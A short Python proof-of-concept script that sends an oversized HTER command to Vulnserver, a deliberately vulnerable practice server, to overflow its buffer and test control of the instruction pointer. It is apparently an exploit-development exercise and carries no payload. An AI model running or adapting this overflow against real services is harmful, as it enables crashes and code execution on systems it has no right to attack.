#########################################################################################
# Title: Vulnserver HTER command exploit
# Author: Marco Lugo
# Description: our suspicion is founded, ASCII gets converted to HEX and so using
#              "41414141" gets us 0x41414141.
#
#              To get Stephen Bradshaw's Vulnserver, visit:
#              http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
#########################################################################################

import socket
import sys
import os

#eip = 'BBBBBBBB' # results in BBBBBBBB
eip = '41414141' # results in 41414141
#eip = '\x20\x30\x40\x50' # results in 00402100
#eip = 'aaaaaaaa' # results in AAAAAAAA

target_ip = sys.argv[1]
buffer = 'HTER '
pattern = 'A' * 2041 + eip + 'C' * 1000
buffer += pattern

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 9999))
sock.recv(1024)
sock.send(buffer)
sock.close()


